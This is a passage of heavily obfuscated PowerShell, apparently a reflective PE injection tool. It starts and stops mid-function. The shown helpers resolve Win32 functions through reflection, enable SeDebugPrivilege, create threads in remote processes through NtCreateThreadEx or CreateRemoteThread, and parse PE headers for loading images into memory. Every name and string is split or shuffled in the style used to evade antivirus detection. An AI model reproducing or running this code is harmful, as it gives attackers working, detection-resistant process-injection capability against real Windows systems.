		[Byte[]]${vA`lU`E1by`Tes} =   (gEt-ChiLDiTeM VARiabLe:tM3Ua  ).VAluE::("{1}{0}"-f'tes','GetBy').Invoke(${valu`E1})
		[Byte[]]${VaL`UE2`BYtES} =  (gi  VArIAbLe:tM3uA).vaLue::("{0}{1}{2}"-f 'GetBy','t','es').Invoke(${VA`L`UE2})
		[Byte[]]${fI`NA`LbYT`ES} =   ( Get-iTEM  ('V'+'aRIA'+'B'+'lE:T'+'M3UA')).valUE::"g`EtByt`eS"([UInt64]0)

		if (${V`Alue`1bY`Tes}."Co`UNT" -eq ${VA`L`UE`2BYtes}."C`OUNT")
		{
			${CA`RryoV`eR} = 0
			for (${i} = 0; ${I} -lt ${v`AlUE1`B`YTEs}."c`Ount"; ${i}++)
			{
				${V`Al} = ${va`lue`1B`yTeS}[${i}] - ${Ca`RRy`Ov`eR}
				
				if (${V`AL} -lt ${VAL`Ue2`By`TeS}[${i}])
				{
					${V`AL} += 256
					${c`A`RryoVEr} = 1
				}
				else
				{
					${cA`RRY`OVEr} = 0
				}
				
				
				[UInt16]${s`UM} = ${V`AL} - ${Va`l`UE2B`YTeS}[${i}]

				${f`in`AlbyTEs}[${I}] = ${s`UM} -band 0x00FF
			}
		}
		else
		{
			Throw ("{6}{3}{1}{8}{7}{13}{5}{2}{11}{10}{4}{9}{0}{12}"-f'fferent ','o','ac','n','of','r','Can',' ','t',' di','tearrays ','t by','sizes','subt')
		}
		
		return  (gI  ('V'+'ariAblE'+':tM'+'3'+'uA')  ).valUe::("{0}{2}{1}" -f 'T','64','oInt').Invoke(${fin`ALbyt`Es}, 0)
	}
	

	Function Add-SiGNE`d`I`N`T`AS`Un`sIGNED
	{
		Param(
		[Parameter(POsitiON = 0, ManDaTOrY = ${T`RUe})]
		[Int64]
		${v`AL`UE1},
		
		[Parameter(POsiTIoN = 1, mAnDatory = ${tR`UE})]
		[Int64]
		${Val`UE2}
		)
		
		[Byte[]]${VALu`e`1bY`Tes} =  (vARIable tM3UA -valUeonly)::("{1}{0}{2}"-f'tByte','Ge','s').Invoke(${V`A`lue1})
		[Byte[]]${v`AlUE2`BYtes} =   ( Gi ("VA"+"RiablE:"+"Tm3"+"ua")  ).VAlue::("{1}{0}{2}"-f 't','GetBy','es').Invoke(${v`ALUe2})
		[Byte[]]${F`I`NaLBY`TES} =  ( GeT-ChILDitEm ('VArIAble'+':T'+'M3U'+'a')).valUE::"GeT`BY`Tes"([UInt64]0)

		if (${ValUE1`By`TES}."C`oUnT" -eq ${V`ALuE2`BYTeS}."cou`Nt")
		{
			${ca`RryOV`eR} = 0
			for (${I} = 0; ${i} -lt ${valUe`1Byt`ES}."COu`Nt"; ${I}++)
			{
				
				[UInt16]${s`UM} = ${vAl`UE`1`Bytes}[${I}] + ${V`AL`Ue2B`yTEs}[${i}] + ${cAr`RY`O`VeR}

				${FInalBY`T`ES}[${I}] = ${S`UM} -band 0x00FF
				
				if ((${s`Um} -band 0xFF00) -eq 0x100)
				{
					${CAr`Ry`OvEr} = 1
				}
				else
				{
					${C`AR`Ry`ovER} = 0
				}
			}
		}
		else
		{
			Throw ("{4}{3}{2}{8}{6}{7}{0}{1}{5}{9}"-f'bytearr','ays of di','n','a','C','fferent siz','t add',' ','no','es')
		}
		
		return  ( gEt-vaRIable  ("TM3U"+"A") -VALUeONl  )::("{0}{1}"-f'To','Int64').Invoke(${FiN`ALby`TeS}, 0)
	}
	

	Function C`O`mPa`RE-`VA`L`1`GRe`AtErthAnVA`L2A`suInT
	{
		Param(
		[Parameter(POsiTIon = 0, MAndatorY = ${T`RUe})]
		[Int64]
		${VA`Lu`e1},
		
		[Parameter(PoSITIon = 1, ManDatoRy = ${Tr`Ue})]
		[Int64]
		${V`AlU`e2}
		)
		
		[Byte[]]${VAl`Ue1b`y`TeS} =  ( gCI ('VARiABLE:T'+'m3u'+'a')  ).VALuE::("{1}{0}{2}"-f'yt','GetB','es').Invoke(${VAl`UE1})
		[Byte[]]${vaLU`E`2BytES} =   ( GeT-vARIabLe  tm3Ua).VAlue::("{0}{2}{1}" -f 'Get','ytes','B').Invoke(${Va`lue2})

		if (${valUe`1`BYTes}."coU`NT" -eq ${vA`l`UE2B`ytes}."Co`Unt")
		{
			for (${i} = ${va`Lu`E1ByTes}."C`OunT"-1; ${I} -ge 0; ${i}--)
			{
				if (${VAlue1B`y`T`eS}[${I}] -gt ${V`Alue2B`ytes}[${I}])
				{
					return ${T`RUe}
				}
				elseif (${va`luE1BYt`ES}[${i}] -lt ${value`2`BY`TES}[${i}])
				{
					return ${FA`LsE}
				}
			}
		}
		else
		{
			Throw ("{7}{6}{1}{2}{0}{8}{5}{3}{4}" -f'rays','e',' ar','siz','e','ent ','yt','Cannot compare b',' of differ')
		}
		
		return ${f`A`LsE}
	}
	

	Function C`O`Nv`ERt-uintTOI`NT
	{
		Param(
		[Parameter(pOsiTIOn = 0, MANDatORy = ${t`RUe})]
		[UInt64]
		${V`Al`UE}
		)
		
		[Byte[]]${V`AL`UeByTES} =  ${tm`3`Ua}::("{0}{1}{2}" -f 'GetBy','t','es').Invoke(${vA`LUE})
		return (  (  VaRIAble Tm3UA).ValUE::("{1}{2}{0}" -f 'Int64','T','o').Invoke(${va`luEb`YTeS}, 0))
	}


    Function gET`-H`ex
    {
        Param(
        [Parameter(PoSITION = 0, MaNdAToRy = ${tR`UE})]
        ${v`A`luE} 
        )

        ${va`LuES`Ize} =  ${gm`Qk}::"si`ZEoF"([Type]${vaL`Ue}.("{0}{1}" -f'GetT','ype').Invoke()) * 2
        ${H`EX} = "0x{0:X$($ValueSize)}" -f [Int64]${val`UE} 

        return ${h`ex}
    }
	
	
	Function t`EST-`M`e`moRYRaNgEv`A`LiD
	{
		Param(
		[Parameter(pOsiTION = 0, MANdaTOrY = ${T`Rue})]
		[String]
		${D`eb`UGstR`ING},
		
		[Parameter(pOsiTion = 1, maNDAtORy = ${T`Rue})]
		[System.Object]
		${p`ein`FO},
		
		[Parameter(POsITiON = 2, MaNdAtOry = ${Tr`Ue})]
		[IntPtr]
		${s`TART`A`ddRESS},
		
		[Parameter(paRAmeTerSetnAme = "eN`d`ADDreSS", PoSItION = 3, MAnDATORy = ${TR`Ue})]
		[IntPtr]
		${e`Nda`DD`ResS},
		
		[Parameter(PaRAMeTerseTName = "sI`zE", pOSiTIon = 3, mAnDATOrY = ${TR`UE})]
		[IntPtr]
		${S`iZe}
		)
		
		[IntPtr]${Fi`NA`lEN`DaD`dRess} =  (  VARiaBLe  u8M1sf).VAlue::"Ze`RO"
		if (${PsC`MD`lET}.parAMetErSEtNAme -eq ("{0}{1}"-f 'Si','ze'))
		{
			[IntPtr]${FIN`AlenD`Addr`ESS} = [IntPtr](&("{5}{1}{0}{2}{3}{4}" -f 'n','I','tA','sU','nsigned','Add-Signed') (${s`TaRt`AD`dR`EsS}) (${si`ze}))
		}
		else
		{
			${fInA`leND`A`DdrE`Ss} = ${EnDaD`d`RESS}
		}
		
		${pEeNdad`D`REss} = ${pE`iN`FO}."e`NdadDr`ESS"
		
		if ((&("{2}{4}{1}{3}{0}{5}" -f'l2AsUI','rThan','Compare-Va','Va','l1Greate','nt') (${pe`I`Nfo}."Peh`AND`LE") (${St`A`R`TaDD`Ress})) -eq ${T`RUE})
		{
			Throw ('T'+'ryi'+'ng '+'to'+' '+'w'+'rite '+'t'+'o '+'memor'+'y '+'s'+'mall'+'er '+'th'+'an '+'a'+'llocated'+' '+'a'+'ddress '+'range'+'. '+"$DebugString")
		}
		if ((&("{5}{6}{7}{0}{1}{3}{4}{2}{8}" -f're-Val1','Gre','hanVal2A','at','erT','Co','m','pa','sUInt') (${FInal`e`NDadD`RESS}) (${PEe`N`dA`dDrESS})) -eq ${T`RUE})
		{
			Throw ('Tryi'+'ng '+'t'+'o '+'w'+'rit'+'e '+'to'+' '+'m'+'em'+'ory '+'great'+'er'+' '+'t'+'han '+'all'+'ocated'+' '+'add'+'re'+'ss '+'ra'+'ng'+'e. '+"$DebugString")
		}
	}
	
	
	Function Wri`Te-bY`TE`sTOM`e`mORy
	{
		Param(
			[Parameter(POSITion=0, mANDatORY = ${TR`UE})]
			[Byte[]]
			${byT`eS},
			
			[Parameter(PosItION=1, mAnDatorY = ${Tr`Ue})]
			[IntPtr]
			${Mem`OR`y`Addr`Ess}
		)
	
		for (${oF`Fs`Et} = 0; ${O`FfS`ET} -lt ${B`YT`ES}."LEnG`Th"; ${oFFs`Et}++)
		{
			  ${gm`qK}::"wr`IteBY`Te"(${mEMO`RYa`ddReSS}, ${OF`F`set}, ${B`y`TEs}[${OF`FsET}])
		}
	}
	

	
	Function gET`-deLe`GAtE`TYPe
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( POSITiON = 0)]
	        [Type[]]
	        ${pA`RAMe`T`eRs} = (&("{0}{1}{2}" -f 'New-Obj','e','ct') ("{0}{1}"-f 'Type[',']')(0)),
	        
	        [Parameter( poSitIOn = 1 )]
	        [Type]
	        ${rETU`RNT`ype} = [Void]
	    )

	    ${dOM`A`IN} =   (GI  VaRIAbLE:9oRUZ).vALUe::"Cu`RreNtd`Om`AIn"
	    ${dynA`S`SE`mbly} = &("{1}{0}{2}" -f'w-Obj','Ne','ect') ("{5}{3}{8}{7}{6}{0}{1}{4}{2}"-f 'Asse','mbly','me','m.Refle','Na','Syste','on.','i','ct')(("{1}{3}{2}{0}" -f 'gate','Reflect','le','edDe'))
	    ${ASS`E`M`BLYBuI`ldEr} = ${dOM`AIn}."D`EF`inedy`Na`mIcaSs`EMBly"(${dYna`SSEm`B`lY},   (dIr vARIAblE:kqf  ).VAluE::"r`UN")
	    ${mO`D`ULEbUI`l`DeR} = ${ASs`eM`BLyB`Ui`LDEr}.("{1}{4}{3}{5}{2}{0}" -f'Module','De','ic','ineD','f','ynam').Invoke(("{1}{4}{3}{2}{0}"-f'e','InMemoryM','ul','d','o'), ${Fal`SE})
	    ${T`Ype`BuILDer} = ${m`oDulE`BuiL`deR}.("{0}{2}{1}"-f 'Defin','ype','eT').Invoke(("{2}{3}{1}{0}" -f'ype','ateT','MyDele','g'), ("{9}{3}{11}{4}{0}{12}{7}{5}{8}{10}{6}{1}{2}" -f ' Sealed, An','C','lass',' ','c,','Class, ','o','i','A','Class,','ut','Publi','s'), [System.MulticastDelegate])
	    ${C`oNs`TruCT`OrbuI`LDEr} = ${ty`peB`UI`lder}.("{0}{1}{3}{2}" -f'DefineCo','n','tor','struc').Invoke(("{5}{4}{2}{3}{6}{1}{8}{0}{9}{7}"-f ',','eBySi','ec','ialName','p','RTS',', Hid','Public','g',' '),  (VARiabLE  ('7X6'+'9U')  -vaL )::"STa`NdA`Rd", ${Pa`Ra`mETerS})
	    ${CO`NSTRUCt`O`R`BUILDeR}.("{0}{1}{2}{6}{3}{4}{5}" -f 'S','etImpl','eme','at','ionFl','ags','nt').Invoke(("{0}{3}{1}{2}" -f 'Runtim',', Manag','ed','e'))
	    ${m`E`Tho`dbUIlD`eR} = ${TyPEBU`i`ld`er}.("{3}{2}{0}{1}"-f'fineM','ethod','e','D').Invoke('Invoke', ("{0}{2}{3}{6}{4}{1}{5}"-f 'Publ','u','ic, HideBySi','g, Ne','Slot, Virt','al','w'), ${rE`T`URNTY`pe}, ${PAR`A`MetE`RS})
	    ${meT`h`oDBUi`ldEr}.("{1}{3}{0}{2}{4}" -f'le','SetIm','mentatio','p','nFlags').Invoke(("{2}{3}{0}{1}{4}" -f 'e,',' Ma','Runti','m','naged'))
	    
	    &("{2}{3}{1}{0}" -f 'put','Out','Write','-') ${tyPEB`U`ild`eR}.("{0}{1}{2}" -f'C','re','ateType').Invoke()
	}


	
	Function GE`T`-`PR`OCadDRess
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( pOsItIOn = 0, MANdatORY = ${T`RUe} )]
	        [String]
	        ${mO`DU`Le},
	        
	        [Parameter( POsItIOn = 1, MANdATORY = ${Tr`Ue} )]
	        [String]
	        ${prOC`ed`UrE}
	    )

	    
	    ${sysTe`mAsSE`mb`ly} =  (VaRiaBle  9ORUZ -valU )::"cur`REntDoM`Ain".("{0}{2}{4}{3}{1}" -f'Ge','ies','tA','embl','ss').Invoke() |
	        &("{0}{3}{1}{2}"-f'W','r','e-Object','he') { ${_}."G`LobAL`A`s`s`EMBlYcachE" -And ${_}."locatI`on".("{1}{0}" -f 'lit','Sp').Invoke('\\')[-1].("{1}{0}"-f'uals','Eq').Invoke(("{3}{2}{0}{1}"-f'.','dll','m','Syste')) }
	    ${u`Nsaf`En`ATiVEMe`T`h`Ods} = ${sYS`Te`maS`sEMBLY}.("{0}{1}" -f'GetTy','pe').Invoke(("{0}{5}{10}{8}{6}{3}{4}{9}{1}{7}{2}"-f 'M','Native','ods','n32','.Uns','icros','i','Meth','W','afe','oft.'))
	    
	    ${GetmoDUl`Eh`An`DlE} = ${un`SA`FE`NATivEMEthodS}.("{1}{0}" -f 'Method','Get').Invoke(("{2}{3}{0}{1}"-f'Handl','e','GetMo','dule'))
	    ${GetpR`ocaDD`R`E`sS} = ${uNs`A`FENaTI`VEM`ETH`O`DS}.("{1}{0}{2}"-f 'e','GetM','thod').Invoke(("{0}{2}{3}{1}"-f'G','ddress','etPr','ocA'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
	    
	    ${kEr`N32Ha`NdlE} = ${G`E`TMod`UL`ehanDLe}."i`N`VOke"(${Nu`ll}, @(${m`o`DuLe}))
	    ${tMp`Ptr} = &("{0}{1}{2}" -f'Ne','w-O','bject') ("{0}{1}{2}" -f'In','t','Ptr')
	    ${haN`Dl`eREF} = &("{1}{2}{0}"-f 'ct','New-','Obje') ("{11}{0}{7}{9}{8}{12}{4}{5}{2}{6}{10}{1}{3}"-f 'em.Ru','leR','es.','ef','ero','pServic','Ha','n','.','time','nd','Syst','Int')(${T`M`pptr}, ${Ker`N3`2`hanDle})

	    
	    &("{1}{2}{0}" -f 'Output','W','rite-') ${g`Etpr`Oc`ADD`ReSs}."iNv`oKe"(${Nu`ll}, @([System.Runtime.InteropServices.HandleRef]${hA`N`DleReF}, ${P`ROce`D`Ure}))
	}


	Function enA`B`lE-sEDeBugpRIv`i`LE`Ge
	{
		Param(
		[Parameter(pOSITIon = 1, mANdAtorY = ${tR`Ue})]
		[System.Object]
		${w`IN`32fUNctIO`NS},

		[Parameter(PoSItIon = 2, manDatORy = ${T`RUE})]
		[System.Object]
		${WIn`32`TYP`es},

		[Parameter(POsITIoN = 3, MandaToRY = ${tr`UE})]
		[System.Object]
		${WIN32C`o`NS`TANtS}
		)

		[IntPtr]${t`HreAD`HAN`D`Le} = ${wIN32FUN`c`TIo`Ns}."Ge`TCURREn`TT`HReaD"."inv`OKe"()
		if (${ThREa`dHAn`D`le} -eq  ( gci vAriAblE:U8m1SF).vALuE::"z`ERO")
		{
			Throw ("{0}{6}{8}{12}{9}{1}{4}{10}{11}{5}{3}{7}{2}"-f'Unable t','h','d',' th','e cu','nt','o g','rea','et the','andle to t','rr','e',' h')
		}

		[IntPtr]${th`ReADToK`En} =  ( gET-VariabLE u8m1SF  -ValueoNly  )::"z`eRO"
		[Bool]${REs`ULt} = ${wi`N32`Fu`NctiONs}."oPENThre`Ad`TokeN"."I`N`VOke"(${TH`REadH`A`Ndle}, ${W`In32C`ON`S`TANts}."to`Ken`_queRy" -bor ${Win32C`Onst`A`NtS}."tOken_A`D`JUsT_P`R`I`VIleGEs", ${faL`sE}, [Ref]${th`REa`Dto`kEN})
		if (${reS`U`Lt} -eq ${fA`LSE})
		{
			${ERR`OR`CodE} =   ${Gm`Qk}::("{2}{3}{0}{1}" -f 'stWin32','Error','G','etLa').Invoke()
			if (${E`R`R`ORcoDe} -eq ${Win32co`Nst`An`TS}."E`RrO`R_No_ToKen")
			{
				${R`Es`UlT} = ${wI`N32FU`N`cti`onS}."I`MPerso`NaTeSe`LF"."IN`Vo`ke"(3)
				if (${REs`ULt} -eq ${f`ALsE})
				{
					Throw ("{8}{4}{0}{7}{5}{6}{2}{3}{1}" -f 'p','f','te s','el','e to im','o','na','ers','Unabl')
				}

				${R`eSuLt} = ${WI`N`3`2FUnCTI`OnS}."O`PenThRe`AdTOK`En"."in`VO`kE"(${th`REAd`haNdLe}, ${w`i`N`32`COnSTANtS}."to`kE`N_QUE`Ry" -bor ${Wi`N3`2cOn`STAntS}."tOKe`N_ADJust_P`R`IVI`leges", ${FaL`se}, [Ref]${THRe`ADT`oKeN})
				if (${R`ESU`lt} -eq ${FaL`SE})
				{
					Throw ("{1}{2}{3}{4}{0}{5}"-f 'ok','Unab','l','e to',' OpenThreadT','en.')
				}
			}
			else
			{
				Throw ('Unab'+'le '+'t'+'o '+'OpenT'+'h'+'r'+'eadToken. '+'Er'+'ror '+'code'+': '+"$ErrorCode")
			}
		}

		[IntPtr]${p`L`Uid} =   ${G`mqK}::"AlLo`cHGLo`B`Al"(  ( Get-vAriABlE  GMQK -vAluEON)::"SI`zE`OF"([Type]${w`I`N32TYP`ES}."LU`ID"))
		${r`esUlT} = ${win`32fUNC`T`IOnS}."lOo`kupPR`iVIleg`EvA`l`UE"."In`VoKE"(${NU`ll}, ("{3}{2}{1}{0}"-f'Privilege','ug','b','SeDe'), ${pl`UId})
		if (${r`e`SUlT} -eq ${FAL`Se})
		{
			Throw ("{6}{9}{3}{2}{5}{8}{0}{1}{7}{4}"-f 'i','vilegeV',' ','ble to call','e','Lo','Un','alu','okupPr','a')
		}

		[UInt32]${tOKe`NPRIV`sIzE} =   ${GM`Qk}::"si`ZeOF"([Type]${wIN32`TY`peS}."tokE`N_p`Riv`iLeG`eS")
		[IntPtr]${Tok`e`Nprivil`eGeS`mem} =  (  gEt-variabLe gMQK -ValuEO  )::("{3}{0}{2}{1}" -f'cHGlob','l','a','Allo').Invoke(${tOkE`NpR`i`VSIze})
		${TOk`EnPR`Ivi`LEg`Es} =  ( gI  ('VAri'+'abLE'+':g'+'mQK')).vaLUE::"P`TRtoS`TrU`cT`UrE"(${TOKe`N`pRi`V`ilEGE`smem}, [Type]${wiN32T`yp`eS}."tO`kEN_PRiV`Ile`g`ES")
		${tOkE`NpRi`Vi`LegEs}."Pri`VILE`gEC`ouNt" = 1
		${toKEN`pRI`V`i`LegES}."pRi`VILE`gEs"."L`UiD" =  ${g`MQk}::"pt`R`To`sTrucT`UrE"(${P`l`Uid}, [Type]${W`IN32T`Y`pes}."L`UId")
		${t`okeNPRIviL`eG`ES}."PRiV`i`lE`GeS"."ATtRibu`T`ES" = ${w`in32c`on`STaNTS}."SE_pr`i`V`iLEGe_e`NA`BLEd"
		 ${G`MQK}::("{2}{3}{0}{1}" -f'u','reToPtr','Str','uct').Invoke(${tO`keN`PR`IViLEG`Es}, ${ToKEnprI`Vi`leg`ESMEm}, ${T`RUe})

		${r`Esu`lT} = ${win32funcTi`O`Ns}."adJusTTOKen`pRIv`IlEg`eS"."I`NvOkE"(${thRe`A`DTOK`En}, ${fa`lse}, ${tO`k`EnPRI`VIl`eGes`MEM}, ${tOkENP`RIvSI`zE},  ${U`8`m1SF}::"Z`ERo",  (  VaRIaBLe U8M1SF -vAluEOnLy  )::"ze`RO")
		${E`R`RORC`oDE} =  ${gM`Qk}::("{4}{3}{5}{1}{2}{0}" -f'r','32Er','ro','s','GetLa','tWin').Invoke() 
		if ((${R`ES`ULt} -eq ${f`AlSe}) -or (${Er`Ro`RCOdE} -ne 0))
		{
			
		}

		 ( vARIAble  ('gMQ'+'K') ).VALuE::("{0}{2}{1}" -f 'Free','bal','HGlo').Invoke(${TOkE`NprivILEG`ES`m`eM})
	}


	Function CRE`ATE-`Re`moTET`h`R`Ead
	{
		Param(
		[Parameter(pOsITION = 1, MaNdaToRy = ${Tr`Ue})]
		[IntPtr]
		${prO`CEsSH`AnDLE},

		[Parameter(PoSITIon = 2, mAnDatORy = ${TR`UE})]
		[IntPtr]
		${S`TArtA`ddRESs},

		[Parameter(POSiTion = 3, MaNdaTory = ${FA`l`Se})]
		[IntPtr]
		${a`R`GUMentP`Tr} =  (  geT-item  vArIAble:U8m1sF).valUe::"z`eRo",

		[Parameter(PoSitIoN = 4, MaNdATORY = ${Tr`UE})]
		[System.Object]
		${w`In`32F`UnctiONS}
		)

		[IntPtr]${ReMO`TeThrE`ADha`N`dle} =   (  gET-VaRIablE  u8m1sf  -VA )::"z`eRO"

		${oS`V`erSi`on} =  (  diR ("vA"+"RiAbl"+"e:u"+"2GZ")  ).VALUE::"O`SvErs`Ion"."vEr`s`iOn"
		
		if ((${oSv`Ers`iOn} -ge (&("{1}{0}{2}{3}" -f'ew','N','-Objec','t') ("{0}{1}"-f 'Vers','ion') 6,0)) -and (${OsVe`Rsi`ON} -lt (&("{0}{1}{2}{3}" -f 'Ne','w-','Objec','t') ("{0}{1}{2}"-f 'V','ers','ion') 6,2)))
		{
			
			${rEt`V`AL}= ${wI`N32f`U`NcT`IonS}."N`TCREAt`eTH`R`eADeX"."i`NVOKE"([Ref]${rEMOTEtHRE`ADHaN`D`LE}, 0x1FFFFF,   (iTEM  vaRIaBle:u8m1sf).vALuE::"Ze`RO", ${pR`o`C`eSsHan`DLE}, ${Starta`d`dRESs}, ${ArgUM`E`Ntptr}, ${Fa`l`SE}, 0, 0xffff, 0xffff,  ( Get-cHILDItEM vaRiABLe:U8m1sf).vAluE::"ZE`Ro")
			${las`T`errOR} =   ${g`mQk}::("{0}{4}{2}{3}{1}" -f 'Get','rror','st','Win32E','La').Invoke()
			if (${RE`mOt`ethrEADHA`ND`Le} -eq   (Get-CHiLDitEM  VARiablE:u8M1sF ).vAluE::"ze`RO")
			{
				Throw ('Err'+'or '+'in'+' '+'NtCreateT'+'hr'+'e'+'adEx.'+' '+'R'+'eturn '+'v'+'alue'+': '+"$RetVal. "+'LastEr'+'r'+'or: '+"$LastError")
			}
		}
		
		else
		{
			
			${REMo`T`E`THR`eAdHAN`dLe} = ${wIN`32Fu`NcTio`Ns}."CRE`A`Te`R`emOTEThReAD"."IN`Voke"(${pRo`cesshA`Ndle},   ${U8`m`1sF}::"ze`RO", [UIntPtr][UInt64]0xFFFF, ${sta`RtAdD`RESS}, ${AR`gU`MEnTPTR}, 0,  ${u8M`1sF}::"Z`eRO")
		}

		if (${r`EMOT`Et`h`READhaNdle} -eq  (Dir  ("Va"+"R"+"iAbLE"+":u8m1SF")  ).ValUE::"ze`Ro")
		{
			&("{1}{2}{3}{0}"-f 'or','Wri','te-Er','r') ("{0}{9}{4}{6}{7}{1}{5}{3}{8}{2}" -f'E',' thread, thre','l','d','ror c','ad han','reating',' remote','le is nul','r') -ErrorAction ("{1}{0}" -f'top','S')
		}

		return ${remoTe`Th`Re`AdhANdle}
	}



	Function gE`T-Ima`gEnth`eADe`Rs
	{
		Param(
		[Parameter(pOSItION = 0, MANdATORy = ${TR`Ue})]
		[IntPtr]
		${pEhA`Nd`lE},

		[Parameter(PoSITiON = 1, maNDAtoRy = ${T`RUe})]
		[System.Object]
		${wIN3`2`T`YPeS}
		)

		${N`T`HEaD`ersInFo} = &("{0}{2}{1}" -f'Ne','ect','w-Obj') ("{1}{2}{3}{0}" -f 't','Syste','m','.Objec')

		
		${Do`Shea`D`eR} =   ( Gci  ('VaRI'+'A'+'bLe:gmq'+'k')).VALUe::"pt`RtO`St`Ru`CTURE"(${PEHa`Nd`Le}, [Type]${w`in32t`yPEs}."Im`AgE_`DOS_h`eAD`er")

		
		[IntPtr]${Nth`eade`R`s`PTR} = [IntPtr](&("{0}{6}{3}{4}{1}{2}{5}"-f'Add-','AsU','ns','ignedI','nt','igned','S') ([Int64]${PE`Han`D`le}) ([Int64][UInt64]${dOSH`eaD`ER}."e_l`FA`NeW"))
		${NtH`eADERsi`Nfo} | &("{2}{1}{3}{0}" -f 'er','e','Add-M','mb') -MemberType ("{1}{3}{2}{0}" -f'ty','NoteProp','r','e') -Name ("{1}{2}{0}{3}"-f'Pt','N','tHeaders','r') -Value ${NtH`eaDeRS`p`TR}
		${IMa`GEnthe`AdErs`64} =  ${gm`qK}::"PtRtOST`RUC`TU`RE"(${nthEAd`E`RspTR}, [Type]${wIN3`2`T`yPes}."image_Nt`_HEADE`R`s64")

		
	    if (${iM`Agent`HE`A`dErs64}."s`ignaTU`Re" -ne 0x00004550)
	    {
	        throw ("{0}{4}{3}{2}{5}{6}{1}"-f 'I','e.','T_HEAD','_N','nvalid IMAGE','E','R signatur')
	    }

		if (${i`mAG`enthea`d`Er`s64}."o`pTiOn`A`LhEAd`ER"."m`AgiC" -eq ("{2}{0}{3}{1}{4}" -f'GE_','DR64','IMA','NT_OPTIONAL_H','_MAGIC'))
		{
			${n`Th`Ea`DeRSINFO} | &("{0}{2}{1}"-f 'Add','ber','-Mem') -MemberType ("{0}{3}{1}{2}"-f 'Not','e','rty','eProp') -Name ("{1}{4}{2}{0}{3}"-f'DER','I','AGE_NT_HEA','S','M') -Value ${I`m`AgentH`E`ADers64}
			${n`ThEA`DersI`N`FO} | &("{0}{1}{3}{2}" -f 'A','dd-','r','Membe') -MemberType ("{1}{2}{0}" -f 'rty','NoteProp','e') -Name ("{1}{0}{2}" -f'6','PE','4Bit') -Value ${T`RUe}
		}
		else
		{
			${imAG`eNt`HeadE`Rs32} =  ( Get-VariablE GmQk  ).VAluE::"Ptrt`OStrUc`T`Ure"(${N`THEA`DERSp`Tr}, [Type]${W`In32tYP`ES}."iM`Age_N`T_hEAdER`s32")
			${NTH`eADeR`sINfO} | &("{2}{1}{0}" -f'ember','-M','Add') -MemberType ("{2}{1}{0}" -f 'rty','pe','NotePro') -Name ("{0}{3}{2}{1}"-f 'IMA','HEADERS','E_NT_','G') -Value ${IMAGeNtHE`A`der`s`32}
			${ntH`EAD`ersI`Nfo} | &("{2}{0}{1}"-f'em','ber','Add-M') -MemberType ("{1}{0}{3}{2}"-f 'roper','NoteP','y','t') -Name ("{0}{1}"-f'P','E64Bit') -Value ${F`A`LSE}
		}

		return ${ntHEAd`ErS`Info}
	}


	
	Function GeT-peBas`i`c`iNfo
	{
		Param(
		[Parameter( pOSITIoN = 0, MANDATorY = ${t`Rue} )]
		[Byte[]]
		${Peb`ytes},

		[Parameter(PosiTIoN = 1, MANDAtORy = ${tR`UE})]
		[System.Object]
		${WiN32T`Y`pES}
		)

		${P`eINfO} = &("{1}{2}{0}"-f't','N','ew-Objec') ("{3}{0}{2}{1}" -f 'ste','.Object','m','Sy')

		
		[IntPtr]${Unm`ANAg`ED`P`eBYT`eS} =  (  lS  ('varIAB'+'lE:'+'gmQk')).ValUe::("{0}{1}{2}{3}"-f'Allo','cHGlo','ba','l').Invoke(${p`ebyT`Es}."L`enGTH")
		  ${g`Mqk}::("{0}{1}"-f'Cop','y').Invoke(${P`e`ByteS}, 0, ${UNmANagedp`e`ByT`ES}, ${p`EbYT`es}."LenG`TH") | &("{2}{1}{0}"-f 'll','Nu','Out-')

		
		${ntH`e`AD`ErsInFo} = &("{1}{3}{2}{0}" -f'ers','Get-','tHead','ImageN') -PEHandle ${Un`MANAGEd`p`E`B`YTES} -Win32Types ${W`in32`Ty`pEs}

		
		${P`Einfo} | &("{1}{0}{2}" -f'em','Add-M','ber') -MemberType ("{0}{2}{1}"-f'NotePr','perty','o') -Name ("{1}{0}"-f'4Bit','PE6') -Value (${nth`eADeR`S`InFo}."pe64B`IT")
		${PEi`Nfo} | &("{1}{2}{0}"-f 'mber','Ad','d-Me') -MemberType ("{2}{0}{1}" -f 'ropert','y','NoteP') -Name ("{1}{2}{0}{3}{4}" -f'nalIm','Ori','gi','ageBas','e') -Value (${nthEaDe`RS`Info}."i`mage_nt`_H`eadeRs"."OPTIO`NaLh`eaD`Er"."Im`Ag`eb`ASe")
		${p`eIN`Fo} | &("{2}{0}{1}" -f'Memb','er','Add-') -MemberType ("{2}{1}{0}"-f'ty','r','NotePrope') -Name ("{1}{0}{3}{2}" -f 'OfIma','Size','e','g') -Value (${N`T`HeadERs`InFo}."IM`AGe_nT`_hEADE`Rs"."O`pti`ona`LheAD`ER"."sI`ZeOFi`magE")
		${p`Ein`FO} | &("{2}{1}{3}{0}"-f 'er','d','Ad','-Memb') -MemberType ("{1}{0}{3}{2}"-f'te','No','perty','Pro') -Name ("{0}{3}{2}{1}"-f'Siz','ders','fHea','eO') -Value (${NtheAD`ERSI`N`Fo}."ima`gE_nt_`h`ead`erS"."Opt`I`onalHeaDEr"."SIzE`o`FHeaDERs")
		${P`EI`NfO} | &("{1}{0}{2}"-f 'M','Add-','ember') -MemberType ("{2}{0}{1}" -f'r','ty','NotePrope') -Name ("{1}{3}{2}{0}" -f'stics','D','aracteri','llCh') -Value (${NtHE`AD`ERSI`NFo}."Im`AgE_N`T_HEaD`ERs"."oPTIonAL`HE`A`DEr"."Dll`cHARActerIs`Ti`Cs")

		
		 ${gM`qK}::("{3}{1}{0}{2}"-f'o','Gl','bal','FreeH').Invoke(${un`MAnAg`ed`Pe`BY`TES})

		return ${PE`InfO}
	}


	
	
	Function geT-p`EDEt`AiLED`infO
	{
		Param(
		[Parameter( pOSITION = 0, maNDAToRy = ${t`RUE})]
		[IntPtr]
		${peh`A`NdLE},

		[Parameter(PosiTIOn = 1, MAnDaTORY = ${T`Rue})]
		[System.Object]
		${W`in3`2t`YpES},

		[Parameter(PoSitIoN = 2, MaNdAtOry = ${tr`UE})]
		[System.Object]
		${w`In32c`onsT`An`TS}
		)

		if (${pEH`A`NDLe} -eq ${N`ULL} -or ${Pe`Ha`NDLE} -eq  (dir VaRiAblE:u8m1SF ).ValUE::"z`ERO")
		{
			throw ("{4}{1}{3}{5}{2}{0}" -f 'r.Zero','Handle ','ull or IntPt','is ','PE','n')
		}

